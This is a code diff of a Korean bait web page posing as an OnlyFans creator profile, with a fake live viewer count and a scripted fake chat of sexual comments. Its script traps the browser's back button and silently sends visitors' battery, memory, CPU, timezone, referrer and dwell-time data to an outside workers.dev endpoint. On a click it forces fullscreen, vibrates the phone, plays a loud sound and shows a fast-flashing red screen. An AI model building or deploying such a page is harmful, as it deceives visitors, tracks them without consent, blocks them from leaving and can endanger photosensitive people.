@@ -10,23 +10,21 @@
     <meta property="og:url" content="https://onlyfans.com/">
     <link rel="icon" href="https://img.icons8.com/fluency/48/user-female-circle.png" type="image/x-icon">
     
-    <!-- 1️⃣ 공통으로 쓰는 사진 3장은 기존처럼 무조건 미리 불러오기 (가장 빠름) -->
+    <!-- 1️⃣ 공통 사진 미리 불러오기 -->
     <link rel="preload" href="maltese.jpg" as="image">
     <link rel="preload" href="background.jpg" as="image">
     <link rel="preload" href="intro.jpg" as="image">
     
-    <!-- 2️⃣ 💡 프로필 사진(pro_이름.jpg)만 꼬리표를 읽어서 0.001초만에 동적으로 Preload에 끼워넣기 -->
+    <!-- 2️⃣ 동적 프로필 사진 Preload -->
     <script>
         const headParams = new URLSearchParams(window.location.search);
         let targetId = headParams.get('p');
         
-        // 만약 이상한 주소로 들어오거나 꼬리표가 없으면 기본값인 'hanjiyu'로 고정
-        const allowedTargets = ['hanjiyu', 'seoarin']; // 🚨 나중에 사람이 늘어나면 여기에 이름 추가 ('hanjiyu', 'seoarin', 'minji' 등)
+        const allowedTargets = ['hanjiyu', 'seoarin'];
         if (!allowedTargets.includes(targetId)) {
             targetId = 'hanjiyu';
         }
 
-        // 즉석에서 <link rel="preload" href="pro_이름.jpg" as="image"> 를 만들어서 붙임
         const preloadLink = document.createElement('link');
         preloadLink.rel = 'preload';
         preloadLink.as = 'image';
@@ -38,18 +36,17 @@
         body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f3f4f6; color: #1f2937; min-height: 100vh; padding-bottom: 50px; }
         #site-logo { position: absolute; top: 20px; left: 20px; max-width: 150px; height: auto; z-index: 10; }
         
-        /* 💡 공통 배경화면 하드코딩 */
         .header-bg { width: 100%; height: 250px; background-color: #d1d5db; background-image: url('background.jpg'); background-size: cover; background-position: center; }
-        /* 1. 기본 설정 (모바일용 - 기존 -60px 유지) */
+        
+        /* 모바일 기본 margin */
         .profile-container { max-width: 800px; margin: -60px auto 0; padding: 0 20px; position: relative; }
 
-        /* 2. PC 화면일 때만 -230px로 수정 */
+        /* PC 화면 margin 조정 */
         @media (min-width: 601px) {
             .profile-container { margin: -230px auto 0; }
         }
         
         .avatar-container { position: relative; width: 240px; height: 240px; margin-bottom: 15px; }
-        /* 💡 프로필은 JS에서 갈아끼울 거라 비워둠 */
         .avatar { width: 100%; height: 100%; border-radius: 50%; border: 5px solid white; background-color: #9ca3af; background-size: cover; background-position: center; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
         .active-badge { position: absolute; bottom: 12px; right: 12px; width: 22px; height: 22px; background-color: #22c55e; border: 4px solid white; border-radius: 50%; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
         
@@ -68,7 +65,6 @@
         .fake-player-container { flex: 1.5; position: relative; border-radius: 16px; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.2); cursor: pointer; transition: transform 0.2s; -webkit-tap-highlight-color: transparent; }
         .fake-player-container:hover { transform: scale(1.02); }
         
-        /* 💡 공통 썸네일 하드코딩 */
         .blurred-thumbnail { width: 100%; height: 100%; min-height: 220px; background-image: url('intro.jpg'); background-size: cover; background-position: center; filter: blur(6px) brightness(0.9); transform: scale(1.05); }
         .play-button-overlay { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 70px; height: 70px; background: rgba(0,0,0,0.6); border: 4px solid white; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-size: 35px; box-shadow: 0 0 20px rgba(0,0,0,0.5); animation: pulse-play 2s infinite; z-index: 2; }
         .video-label { position: absolute; bottom: 12px; left: 12px; color: white; background: rgba(239, 68, 68, 0.9); padding: 5px 10px; border-radius: 8px; font-weight: bold; font-size: 13px; z-index: 2; }
@@ -79,52 +75,67 @@
             100% { transform: translate(-50%, -50%) scale(1); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0); }
         }
 
-        /* 🔥 채팅창(부모 컨테이너) 크기 완벽 고정 (height 220px 고정) 🔥 */
+        /* ==========================================
+           💬 채팅창 CSS (step-by-step 수정 적용)
+           ========================================== */
+
+        /* 1. 부모 박스: 높이 고정 및 Flex 충돌 방지 */
         #fake-chat-zone { 
             flex: 1; 
-            min-height: 0; /* 자식 크기에 따라 부모 창이 강제로 커지는 현상 완벽 차단 */
+            display: flex; 
+            flex-direction: column;
+            
+            /* 🔥 핵심 수정: 박스 크기 절대 고정 🔥 */
+            height: 220px; 
+            max-height: 220px; /* PC/모바일 통일 */
+            min-height: 0;    /* Flex 자식으로 인한 늘어남 방지 */
+            
             background: rgba(255, 255, 255, 0.8); 
             backdrop-filter: blur(10px); 
             -webkit-backdrop-filter: blur(10px); 
             border-radius: 16px; 
             padding: 12px; 
-            display: flex; 
-            flex-direction: column; 
-            overflow: hidden; 
             box-shadow: 0 -5px 15px rgba(0,0,0,0.05); 
             border: 1px solid rgba(0,0,0,0.05); 
-            position: relative; 
+            position: relative;
+            
+            /* 넘치는 자식 요소(채팅) 숨김 */
+            overflow: hidden; 
         }
         
-        /* 🔥 실제 채팅이 담기는 영역 (스크롤 생성) 🔥 */
+        /* 2. 자식 메시지 영역: 내부 스크롤 생성 */
         #chat-messages { 
-            flex: 1; 
-            min-height: 0; /* 스크롤이 박스를 뚫고 나가지 않게 묶어두는 핵심 코드 */
             display: flex; 
             flex-direction: column; 
             gap: 8px; 
+            
+            /* 🔥 핵심 수정: 내부 스크롤 활성화 🔥 */
+            height: 100%; 
             width: 100%; 
-            overflow-y: auto; /* 내용이 넘치면 세로 스크롤 생성 */
+            overflow-y: auto; /* 세로 스크롤만 허용 */
+            min-height: 0;    /* 스크롤 오작동 방지 */
+            
+            /* 스크롤바 세팅 */
             padding-right: 5px; 
             scroll-behavior: smooth; 
         }
 
-        /* 커스텀 스크롤바 디자인 */
-        #chat-messages::-webkit-scrollbar { width: 5px; }
+        /* 커스텀 스크롤바 디자인 (Webkit) */
+        #chat-messages::-webkit-scrollbar { width: 4px; }
         #chat-messages::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
+        #chat-messages::-webkit-scrollbar-track { background: transparent; }
         
-        /* 채팅 폰트 굵게, 크기 조정 */
-        .chat-msg { font-size: 13px; line-height: 1.4; animation: fade-in-up 0.3s ease-out; cursor: pointer; font-weight: 900; }
+        /* 채팅 멘트 굵게, 크기 조정 */
+        .chat-msg { font-size: 13px; line-height: 1.4; animation: fade-in-up 0.3s ease-out; font-weight: 900; }
         .chat-user { font-weight: 900; }
         .chat-text { color: #111827; font-weight: 900; }
         
         /* BJ 멘트 스타일 */
-        .bj-msg { background: #fef3c7; border-left: 4px solid #f59e0b; padding: 6px 8px; border-radius: 4px; margin-top: 4px; margin-bottom: 4px; animation: bounce-in 0.5s ease-out; }
-        .bj-name { color: #ea580c !important; text-shadow: 1px 1px 0px rgba(255,255,255,0.5); }
+        .bj-msg { background: #fef3c7; border-left: 4px solid #f59e0b; padding: 6px 8px; border-radius: 4px; margin-top: 2px; margin-bottom: 2px; }
+        .bj-name { color: #ea580c !important; }
         .bj-text { color: #b45309; font-weight: 900; }
 
-        @keyframes fade-in-up { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        @keyframes bounce-in { 0% { opacity: 0; transform: scale(0.9); } 50% { opacity: 1; transform: scale(1.02); } 100% { transform: scale(1); } }
+        @keyframes fade-in-up { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
 
         @media (max-width: 600px) {
             .header-bg { height: 170px; } 
@@ -138,7 +149,7 @@
             .blurred-thumbnail { min-height: 170px; }
             .play-button-overlay { width: 50px; height: 50px; font-size: 25px; }
             .video-label { font-size: 11px; padding: 4px 8px; bottom: 8px; left: 8px; }
-            #fake-chat-zone { padding: 8px; }
+            #fake-chat-zone { padding: 8px; height: 170px; max-height: 170px; } /* 모바일에서는 높이 축소 */
             .chat-msg { font-size: 11px; }
         }
 
@@ -161,7 +172,7 @@
             100% { transform: translate(2px, -3px) rotate(-2deg); }
         }
         @keyframes flash { 0%, 100% { background-color: black; } 50% { background-color: #991b1b; } }
-        .horror-active #maltese-img { animation: shake 0.1s infinite; will-change: transform; }
+        .horror-active #maltese-img { animation: shake 0.1s infinite; }
         .horror-active #prank-zone { animation: flash 0.08s infinite; }
         .horror-active, .horror-active * { cursor: none !important; }
     </style>
@@ -170,12 +181,10 @@
 <body oncontextmenu="return false;">
 
     <img id="site-logo" src="logo.png" alt="사이트 로고">
-    <!-- 배경 하드코딩 적용됨 -->
     <div class="header-bg"></div>
 
     <div class="profile-container">
         <div class="avatar-container">
-            <!-- 💡 ID 추가: 프로필 프사 적용 구역 -->
             <div class="avatar" id="profile-avatar"></div>
             <div class="active-badge"></div>
         </div>
@@ -185,7 +194,6 @@
                 <div class="live-dot"></div>
                 <span>LIVE: <span id="visitor-count">214</span>명 시청 중</span>
             </div>
-            <!-- 💡 ID 추가: 이름, 닉네임, 소개글 -->
             <h1 class="name" id="profile-name">HanJiyu07 <span class="verified-badge">✓</span></h1>
             <p class="username" id="profile-username">@onlyfans_hanjiyu07</p>
             <div class="bio" id="profile-bio">
@@ -197,12 +205,12 @@
 
         <div class="media-row">
             <div id="video-bait" class="fake-player-container js-prank-btn">
-                <!-- 썸네일 하드코딩 적용됨 -->
                 <div class="blurred-thumbnail"></div>
                 <div class="play-button-overlay">▶</div>
                 <div class="video-label">Live</div>
             </div>
             
+            <!-- 💬 채팅창 영역 -->
             <div id="fake-chat-zone">
                 <div id="chat-messages"></div>
             </div>
@@ -217,7 +225,6 @@
 
     <div id="overlay"></div>
     <div id="prank-zone">
-        <!-- 💡 공통 귀신사진 유지 -->
         <img id="maltese-img" src="maltese.jpg" alt="말티즈" draggable="false">
         <div class="prank-text"></div>
         <audio id="bark-sound" src="bark.mp3" preload="auto"></audio>
@@ -225,11 +232,8 @@
 
     <script>
         // ==========================================
-        // 🎭 0. 프로필 텍스트 & 프사 둔갑술 (최적화 버전)
+        // 🎭 프로필 설정
         // ==========================================
-        // 위에 <head>에서 미리 걸러둔 targetId 변수를 그대로 씁니다.
-
-        // 💡 타겟별 "텍스트" 설정 장부 (사진명은 뺐음!)
         const profileDB = {
             "hanjiyu": {
                 name: "HanJiyu07",
@@ -247,17 +251,14 @@
 
         const currentData = profileDB[targetId];
 
-        // 1️⃣ 텍스트 갈아끼우기
         document.title = `${currentData.name} | Profile & Stats`;
         document.getElementById('profile-name').innerHTML = `${currentData.name} <span class="verified-badge">✓</span>`;
         document.getElementById('profile-username').innerText = currentData.username;
         document.getElementById('profile-bio').innerHTML = currentData.bio;
-
-        // 2️⃣ 프로필 사진 갈아끼우기 (규칙: pro_이름.jpg)
         document.getElementById('profile-avatar').style.backgroundImage = `url('pro_${targetId}.jpg')`;
 
         // ==========================================
-        // 🔒 1. 갇힘(Trap) 시스템 발동 로직 
+        // 🔒 낚시 로직 (Trap, Stats, Serverless)
         // ==========================================
         history.pushState(null, null, location.href);
         window.onpopstate = function () {
@@ -274,9 +275,6 @@
             else { document.title = `${currentData.name} | Profile & Stats`; }
         });
 
-        // ==========================================
-        // 📈 2. 실시간 방문자 페이크 로직 
-        // ==========================================
         const countEl = document.getElementById('visitor-count');
         let currentCount = Math.floor(Math.random() * (300 - 120 + 1)) + 120;
         countEl.innerText = currentCount;
@@ -288,9 +286,6 @@
             countEl.innerText = currentCount;
         }, 4000);
 
-        // ==========================================
-        // 📡 3. 서버리스 백엔드 통신 및 정보 수집 
-        // ==========================================
         const WORKER_URL = "https://flat-night-2b27.chldudwo2158.workers.dev"; 
         const startTime = new Date();
         let isPrankActive = false;
@@ -307,38 +302,36 @@
                 body: JSON.stringify({
                     type: type,
                     detail: detail,
-                    referrer: document.referrer || "직접 입력/북마크",
+                    referrer: document.referrer || "direct",
                     dwellTime: getDwellTime(),
                     userData: userData
                 })
-            }).catch(err => console.log("로그 전송 실패"));
+            }).catch(err => {});
         }
 
         let userData = {
             battery_info: null,
             timeZone: new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' }),
-            deviceMemory: navigator.deviceMemory || '알 수 없음',
-            cpuCores: navigator.hardwareConcurrency || '알 수 없음'
+            deviceMemory: navigator.deviceMemory || 'unknown',
+            cpuCores: navigator.hardwareConcurrency || 'unknown'
         };
         
         if ('getBattery' in navigator) {
             navigator.getBattery().then(function(battery) {
-                const level = Math.round(battery.level * 100); 
-                const isCharging = battery.charging ? "충전 중 ⚡" : "배터리 사용 중 🔋";
-                userData.battery_info = `현재 배터리: **${level}%** (${isCharging})`;
+                userData.battery_info = `current: ${Math.round(battery.level * 100)}% (${battery.charging ? "charging" : "using"})`;
                 logToBackend("entry");
             });
         } else {
-            userData.battery_info = "배터리 조회 불가 (아이폰/구형) 🥲";
+            userData.battery_info = "battery api impossible";
             logToBackend("entry");
         }
 
         // ==========================================
-        // 💬 4. 가짜 실시간 채팅 로직 (중복 완벽 방지 & 풀 확장)
+        // 💬 가짜 실시간 채팅 로직 (step-by-step 수정 적용)
         // ==========================================
         const chatMessages = document.getElementById('chat-messages');
         
-        // 채팅 풀 확장 (20개로 늘려 중복되는 느낌 최소화)
+        // 1. 채팅 멘트 풀 확장 (20개) - 중복 느낌 최소화
         const chatData = [
             { user: "vip_kim", type: "vip", color: "#eab308", text: "방금 올라온 3번째 영상 개지림, 두 발 뺐음;" },
             { user: "guest_999", type: "normal", color: "#3b82f6", text: "ㅗㅜㅑ 고양이 자세 부탁드립니다" },
@@ -362,6 +355,7 @@
             { user: "yesyes", type: "normal", color: "#3b82f6", text: `제대로 해봐 현기증 난다` }
         ];
 
+        // 셔플 함수 (Fisher-Yates)
         function shuffleArray(array) {
             for (let i = array.length - 1; i > 0; i--) {
                 const j = Math.floor(Math.random() * (i + 1));
@@ -369,18 +363,19 @@
             }
         }
         
+        // 초기 셔플
         shuffleArray(chatData);
 
         let chatIndex = 0;
-        let lastPrintedUser = ""; // 방금 출력된 사람 기억 (연속 중복 방지용)
+        let lastPrintedUser = ""; // 연속 중복 방지용 변수
 
-        function addFakeMessage(isInit = false) {
-            // 목록을 다 썼으면 다시 섞기
+        function addFakeMessage() {
+            // 2. 목록 다 썼으면 리셔플 및 연속 중복 방지
             if (chatIndex >= chatData.length) {
                 shuffleArray(chatData);
                 chatIndex = 0;
                 
-                // 💡 [핵심] 새로 섞은 1번 타자가 직전에 친 사람과 똑같으면 순서를 바꿔치기함
+                // 새로 섞은 첫 대화가 이전 턴 마지막과 같으면 1,2번 순서 변경
                 if (chatData[0].user === lastPrintedUser) {
                     [chatData[0], chatData[1]] = [chatData[1], chatData[0]];
                 }
@@ -388,51 +383,55 @@
 
             const msg = chatData[chatIndex];
             chatIndex++; 
-            lastPrintedUser = msg.user; // 방금 출력한 사람 저장
+            lastPrintedUser = msg.user; 
             
+            // 등급 뱃지
             let badge = "";
             if (msg.type === "vip") badge = "👑 ";
             if (msg.type === "manager") badge = "🛡️ ";
 
             const msgEl = document.createElement('div');
-            msgEl.className = 'chat-msg js-prank-btn';
-            
-            if(isInit) msgEl.style.animation = "none"; 
-            
+            msgEl.className = 'chat-msg'; // 초기 깔아두기용 애니메이션 제거
             msgEl.innerHTML = `<span class="chat-user" style="color: ${msg.color}">${badge}${msg.user}:</span> <span class="chat-text">${msg.text}</span>`;
             
-            chatMessages.appendChild(msgEl); 
+            chatMessages.appendChild(msgEl); // 아래로 추가
             
+            // 3. 스크롤 유지 위해 메시지 개수 제한 (50개)
             if (chatMessages.children.length > 50) {
                 chatMessages.removeChild(chatMessages.firstChild);
             }
             
+            // 최하단 스크롤 고정
             chatMessages.scrollTop = chatMessages.scrollHeight;
         }
 
-        // 페이지 열리자마자 5개 깔아두기
+        // 페이지 초기 진입 시 채팅 미리 깔아두기 (5개)
         for(let i = 0; i < 5; i++) {
-            addFakeMessage(true);
+            addFakeMessage();
         }
 
-        // 채팅 자동 생성 타이머
+        // 실시간 채팅 루프
         function startChat() {
+            // 애니메이션 클래스 추가
+            const messages = chatMessages.querySelectorAll('.chat-msg');
+            messages.forEach(m => m.style.animation = ""); // 애니메이션 초기화
+
             addFakeMessage();
             setTimeout(startChat, Math.random() * 800 + 700);
         }
         setTimeout(startChat, 1000);
 
-        // BJ 멘트 (페이지 열리고 정확히 4초 뒤에 출력)
+        // 4. BJ 멘트 고정 출력 (4초 후)
         setTimeout(() => {
             const msgEl = document.createElement('div');
-            msgEl.className = 'chat-msg bj-msg js-prank-btn';
+            msgEl.className = 'chat-msg bj-msg';
             msgEl.innerHTML = `<span class="chat-user bj-name">📢 BJ ${currentData.name}:</span> <span class="chat-text bj-text"> 입장 20분 뒤에 막을게요! 추천 즐겨찾기 필수! ❤️</span>`;
             chatMessages.appendChild(msgEl);
             chatMessages.scrollTop = chatMessages.scrollHeight;
         }, 4000);
 
         // ==========================================
-        // 🎭 5. 지옥문 오픈 (최종 Prank 로직)
+        // 🎭 Prank 발동
         // ==========================================
         const prankZone = document.getElementById('prank-zone');
         const overlay = document.getElementById('overlay');
@@ -447,9 +446,7 @@
 
             const docEl = document.documentElement;
             if (docEl.requestFullscreen) {
-                docEl.requestFullscreen().catch(err => {
-                    console.log("전체화면 차단됨");
-                });
+                docEl.requestFullscreen().catch(() => {});
             }
 
             if ('vibrate' in navigator) {
@@ -459,66 +456,54 @@
             overlay.style.display = 'block';
             prankZone.style.display = 'block';
             
-            let playPromise = audio.play();
-            
-            if (playPromise !== undefined) {
-                playPromise.then(_ => {
-                    hasAudioPlayed = true;
-                    if (!hasSeenPicture) {
-                        hasSeenPicture = true;
-                        logToBackend("great_success", detail);
-                    }
-                }).catch(error => {
-                    hasAudioPlayed = false;
-                    console.log("오디오 자동 재생 차단됨");
-                    if (!hasSeenPicture) {
-                        hasSeenPicture = true;
-                        logToBackend("success", detail);
-                    }
-                });
-            }
+            audio.play().then(() => {
+                hasAudioPlayed = true;
+                if (!hasSeenPicture) {
+                    hasSeenPicture = true;
+                    logToBackend("great_success", detail);
+                }
+            }).catch(() => {
+                hasAudioPlayed = false;
+                if (!hasSeenPicture) {
+                    hasSeenPicture = true;
+                    logToBackend("success", detail);
+                }
+            });
 
             const playLabel = document.querySelector('.video-label');
-            if (playLabel) playLabel.innerText = "연결 실패! (강아지 출몰)";
+            if (playLabel) playLabel.innerText = "connect failed! (maltese appear)";
             
             document.body.style.overflow = 'hidden';
         }
 
-        // ==========================================
-        // 😱 6. 패닉 클릭/키보드 감지 로직
-        // ==========================================
+        // 패닉 액션
         function catchPanicAction() {
             if (isPrankActive && !hasAudioPlayed) {
                 const docEl = document.documentElement;
                 if (docEl.requestFullscreen && !document.fullscreenElement) {
-                    docEl.requestFullscreen().catch(err => console.log("전체화면 차단됨"));
+                    docEl.requestFullscreen().catch(() => {});
                 }
                 
                 if ('vibrate' in navigator) {
                     navigator.vibrate([100, 50, 100, 50, 800]); 
                 }
 
-                let panicPromise = audio.play();
-                if (panicPromise !== undefined) {
-                    panicPromise.then(_ => {
-                        hasAudioPlayed = true;
-                        logToBackend("medium_success", "panic_interaction");
-                    }).catch(err => console.log("패닉 상태에서도 재생 실패"));
-                }
+                audio.play().then(() => {
+                    hasAudioPlayed = true;
+                    logToBackend("medium_success", "panic_interaction");
+                }).catch(() => {});
             }
         }
         
         window.addEventListener('click', catchPanicAction);
         window.addEventListener('keydown', catchPanicAction);
 
-        // ==========================================
-        // 🟢 낚시 발동 트리거 
-        // ==========================================
+        // 트리거 등록
         const videoBait = document.getElementById('video-bait');
         videoBait.addEventListener('click', function(e) { 
             e.stopPropagation(); 
             const label = this.querySelector('.video-label');
-            label.innerText = "🎥 영상 연결 중 (서버 확인)...";
+            label.innerText = "video connecting... (check server)";
             label.style.background = "#059669"; 
             
             setTimeout(() => { triggerPrank("click_video"); }, 800);
